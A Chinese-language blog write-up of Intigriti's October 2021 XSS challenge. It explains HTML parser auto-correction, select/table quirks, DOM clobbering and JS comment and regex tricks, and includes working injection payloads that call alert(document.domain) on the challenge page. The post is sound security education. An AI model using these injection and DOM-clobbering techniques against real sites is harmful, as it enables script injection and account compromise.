---
title: 從 Intigriti 十月份 XSS 挑戰重新學習 HTML
catalog: true
date: 2021-11-14 15:20:49
tags: [Front-end, Security]
categories: [Security]
---

## 前言

之前已經介紹過 Intigriti 的 XSS 挑戰很多次了，這次就不再介紹了，有興趣的可以直接翻我之前的文章。這一篇文章的重點會放在他們[十月份](https://challenge-1021.intigriti.io/)的挑戰，難度不高，我花了大約一兩天的時間解出來以後就放著沒動，會想寫這篇是因為挑戰結束以後，看到許多超乎我想像的解法，因此特地寫一篇文章記錄一下。

<!-- more -->

## 關於挑戰

底下先簡單講一下這次的題目要做什麼，核心程式碼是這樣的：

``` js
window.addEventListener("DOMContentLoaded", function () {
  e = `)]}'` + new URL(location.href).searchParams.get("xss");
  c = document.getElementById("body").lastElementChild;
  if (c.id === "intigriti") {
    l = c.lastElementChild;
    i = l.innerHTML.trim();
    f = i.substr(i.length - 4);
    e = f + e;
  }
  let s = document.createElement("script");
  s.type = "text/javascript";
  s.appendChild(document.createTextNode(e));
  document.body.appendChild(s);
});
```

首先，有一個字串 `e` 會被丟去 script 標籤裡面，因此只要 `e` 變成一串合法的 JS 程式碼，呼叫 `alert(document.domain)` 就獲勝了。而 e 的預設內容就是一個奇形怪狀的字串：`)]}'` 再加上 query string 上的 xss 的值。

接下來就是這題的精華了，會先判斷 body 的 lastElementChild 的 id 是不是 intigriti，是的話就去拿這個元素的 lastElementChild 的 innerHTML 的最後四個字元，然後放到 e 前面。我們先叫這四個字 last4 好了，e 就會是 `{last4})]}'{qs}`，總之目標就是讓這整段是個合法程式碼。

qs 的部份因為可以自己控制，所以沒什麼問題，但重點是前面那個 last4。

我當初的想法很簡單，只要 last4 的開頭是 `'`，那前面就會變一段字串，再搭配 qs 就可以變一段合法程式碼，像這樣：`'xxx)]}';alert(1)`。

問題來了，那該怎麼控制 last4？這就要看題目另一個可以做 HTML injection 的地方。

``` html
<div id="html" class="text"><h1 class="light">
here
</div>
<!-- !!! -->
<div class="a">'"</div>
</body>
<div id="container">
    <span>I</span>
    <span id="extra-flicker">N</span>
    <span>T</span>
    <span>I</span>
    <div id="broken">
        <span id="y">G</span>
    </div>
    <span>R</span>
    <div id="broken">
        <span id="y">I</span>
    </div>
    <span>T</span>
    <span>I</span>
</div>
```

題目的 HTML 最後一部分長這樣，而那個 `here` 地方的值我們可以控制，所以可以注入任意 HTML 進去（但直接想做 XSS 是沒用的，因為有 CSP）。在現今的狀況之下，body 的 lastElementChild 會是 container。

所以我們的第一個挑戰就是想辦法改變 lastElementChild。

## HTML 的自動修正

雖然說看似木已成舟，沒辦法改變最後的元素，但事實上我們可以把整段用一個沒有關閉標籤的 div 包起來，像是這樣：

``` html
<div id="html" class="text"><h1 class="light">
<!-- 底下是注入的值 -->
</h1> <!-- 關閉前面的 h1 -->
</div> <!-- 關閉 id=html 的 div -->
<div id=intigriti> <!-- 建立一個沒有關閉標籤的 div -->
<div> <!-- 關閉下面那個 div，沒有這個的話上面的 intigriti 就被關閉了 -->
<!-- 上面是注入的值 -->
</div>
<!-- !!! -->
<div class="a">'"</div>
</body>
<div id="container">
    <span>I</span>
    <span id="extra-flicker">N</span>
    <span>T</span>
    <span>I</span>
    <div id="broken">
        <span id="y">G</span>
    </div>
    <span>R</span>
    <div id="broken">
        <span id="y">I</span>
    </div>
    <span>T</span>
    <span>I</span>
</div>
```

排版過後會是這樣：

``` html
<div id="html" class="text">
  <h1 class="light"></h1>
</div>
<div id=intigriti>
  <div></div>
  <!-- !!! -->
  <div class="a">'"</div>
  </body>
  <div id="container">
    <span>I</span>
    <span id="extra-flicker">N</span>
    <span>T</span>
    <span>I</span>
    <div id="broken">
        <span id="y">G</span>
    </div>
    <span>R</span>
    <div id="broken">
        <span id="y">I</span>
    </div>
    <span>T</span>
    <span>I</span>
  </div>
```

DOM 結構是這樣：

![](/img/intigriti-1021/p1.png)


你會很明顯發現 container 被包起來了，而沒有閉合標籤也沒關係，因為瀏覽器會自己幫我們修復，就是這麼神奇。不過照現在這樣，intigriti 的 lastElementChild 會是 `<div id=container>`，而它的 innerHTML 最後四個字會是 `pan>`，沒辦法組成合法程式碼，所以我們需要找到一個方法去控制最後四個字。

## 控制 last4

這邊是我卡最久的地方，因為我一直卡在要控制「內容」，想辦法增加內容進去，但礙於結構就是長這樣，所以我沒辦法讓新增的內容變成 last child。不過後來我突然突破了盲點，想到其實不需要控制內容，控制標籤就好了！

我們可以把它再包起來兩次，像這樣：

``` html
<div id="html" class="text">
  <h1 class="light"></h1>
</div>
<div id=intigriti>
  <test1>
    <test2>
      <div></div>
      <div class="a">'"</div>
      </body>
      <div id="container">
        <span>I</span>
        <span id="extra-flicker">N</span>
        <span>T</span>
        <span>I</span>
        <div id="broken">
            <span id="y">G</span>
        </div>
        <span>R</span>
        <div id="broken">
            <span id="y">I</span>
        </div>
        <span>T</span>
        <span>I</span>
      </div>
```

結構就會變成這樣：

![](/img/intigriti-1021/p2.png)

如此一來，intigriti 的 last child 就變成 test1，它的 innerHTML 就變成 test2，最後四個字就變成 `st2>`。這邊我們利用了自定義標籤加上瀏覽器會自動關閉的性質，就可以控制最後四個字。

所以只要把 `<test2>` 改成 `<tes't2>`，last4 就會變成 `'t2>`，以單引號開頭，達成我們的目標，接著再把 xss 設定為 `;alert(document.domain)`，就大功告成了：

![](/img/intigriti-1021/p3.png)

## 預期外的解法

這題我做到上面那樣以後，就想說解完了沒我的事情了，然後我也沒預期到會有其他解法（我太天真），直到官方公開了其他人的 writeup，才發現我真的是井底之蛙呱呱呱。

會想寫這篇也是因為那些預期外的解法，每個都可以多學到一些東西，底下我們一個個來看。

### 利用 HTML 標籤的特殊行為

底下技巧學習自 [@svennergr](https://gist.github.com/svennergr/53b904a08f42bd7f588bde38a02345f1)

我在解這題的時候，之所以最後會在外面用標籤再包住，是因為如果不這樣做的話，我沒辦法控制 intigriti 底下的 lastElementChild，會變成是 container 那個 div。

但其實有些 HTML 標籤的行為可以突破這個僵局，例如說神奇的 `<select>`，我們的 payload 傳入：`</h1></div><div id=intigriti><select>`，HTML 就會是這樣：

``` html
<div id="html" class="text">
  <h1 class="light"></h1>
</div>
<div id=intigriti>
  <select>
    </div>
    <div class="a">'"</div>
    </body>
    <div id="container">
      <span>I</span>
      <span id="extra-flicker">N</span>
      <span>T</span>
      <span>I</span>
      <div id="broken">
          <span id="y">G</span>
      </div>
      <span>R</span>
      <div id="broken">
          <span id="y">I</span>
      </div>
      <span>T</span>
      <span>I</span>
    </div>
```

那你猜最後變成了什麼？

select 裡面那一堆標籤居然全都變不見了！

![](/img/intigriti-1021/p4.png)

而 lastElementChild 取的是 element 而不是 node，所以如果我們加上 option，就會變成唯一的 element，再把 `<div id=intigriti>` 換成 `<select id=intigriti>`，就會變這樣：

![](/img/intigriti-1021/p5.png)

如此一來，就成功控制了 lastElementChild 的內容，達成了我原本以為做不到的事情！

而另一個神奇的元素叫做 table，我們的程式碼長這樣，payload 是 `</h1></div><table id=intigriti><tbody>`：

``` html
<div id="html" class="text">
  <h1 class="light"></h1>
</div>
<table id=intigriti>
  <tbody>
    </div>
    <div class="a">'"</div>
    </body>
    <div id="container">
      <span>I</span>
      <span id="extra-flicker">N</span>
      <span>T</span>
      <span>I</span>
      <div id="broken">
          <span id="y">G</span>
      </div>
      <span>R</span>
      <div id="broken">
          <span id="y">I</span>
      </div>
      <span>T</span>
      <span>I</span>
    </div>
```

可是 render 出來的時候，table 居然自己變成最後一個元素：

![](/img/intigriti-1021/p6.png)

我實際嘗試了一下，在 table 內但是不屬於 table 可以利用的元素，就會跳出來，例如說：

``` html
<body>
<table>
    <tr><div>123</div></tr>
    <h1>last</h1>
</body>
```

放到 DOM 上面以後會變成：

``` html
<body>
    <div>123</div>
    <h1>last</h1>
    <table>
        <tbody>
            <tr></tr>
        </tbody>
    </table>
</body>
```

而如果我們在 tr 裡面是有註解 `<!-- -->` 的話，也是可以帶進 tr 內的（用 td 也可以），而更驚奇的來了，intigriti 那個 table 的案例，內容不是 `<!-- !!! -->` 嗎？所以最後四個字是 ` -->`，這其實是 JS 的註解。

![](/img/intigriti-1021/p7.png)

在[七月份挑戰](https://blog.huli.tw/2021/08/06/intigriti-xss-0721/)中我們得知 `<!--` 是註解，但沒想到 `-->` 居然也是註解，真是大開眼界。

而在原文也有整理了一份清單，直接跑遍每個標籤看哪些可以放在 `<select>` 跟 `<table>` 裡面，看起來 `<script>`, `<style>` 跟 `<template>` 都可以出現在裡面而不會被移除掉。

### DOM clobbering

此解法來自 [@airispoison](https://twitter.com/airispoison/status/1455451323759988737
)，是我覺得超有創意的解法。

他的 payload 是：

``` js
?html=</div><form id=intigriti><button id=lastElementChild>/*</button>&xss=*/alert(document.domain)
```

他在 hacking 的是這一段：

``` js
c = document.getElementById("body").lastElementChild; // 會拿到 <form id=intigriti>
if (c.id === "intigriti") {
  l = c.lastElementChild; // 這邊拿到的會是 <button id=lastElementChild>，而不是真的 lastElementChild！
  i = l.innerHTML.trim();
  f = i.substr(i.length - 4);
  e = f + e;
}
```

這個解法的巧妙之處是 `lastElementChild` 原本應該是要拿到 DOM 上的 lastElementChild，結果因為被 DOM clobbering 蓋掉，所以拿到了 id 是 lastElementChild 的 button！

如此一來，innerHTML 就可控了，就可以傳入任意值組成合法 JS。談到合法 JS，我們最後來看看有哪幾種方法可以組成合法 JS。

### 組成合法 JS

假設我們有一個字串是：`)]}'`，我們可以在前面加入最多四個字元，在後面加入任意字元，那該怎樣湊出可以執行的 JS 程式碼？

我自己覺得最直覺的想法之一就是在前面加上單引號，如此一來就變一個字串，後面再加上一些東西就可以執行，像這樣：

``` js
')]}';console.log(1)
')]}',console.log(1)
')]}'+console.log(1)
```

除此之外，單行註解加上換行或是多行註解也是很直覺的想法：

``` js
//)]}'
console.log(1)

/*)]}'*/console.log(1)
```

而從文章中我們知道，其實 JS 還有一些你不知道的註解方式：

``` js
<!--)]}'
console.log(1)

-->)]}'
console.log(1)
```

相關的 V8 測試檔在這裡：[v8/test/mjsunit/html-comments.js](https://github.com/v8/v8/blob/901b67916dc2626158f42af5b5c520ede8752da2/test/mjsunit/html-comments.js)

除了上面這些，還可以用 RegExp！

``` js
/()]}'/+console.log(1)
/[)]}'/+console.log(1)
```

## 結語

不只是 JS，HTML 也是博大精深，各種神奇的特性，本來以為這次挑戰算是輕鬆通過，但其實只是用自己本來就會的解法過關而已，比起過關，從其他人的解答中學習似乎更重要，這次挑戰中學到了：

1. `<select>` 與 `<table>` 標籤的行為
2. `<!--` 與 `-->` 當作註解
3. 用 regexp 組出合法程式碼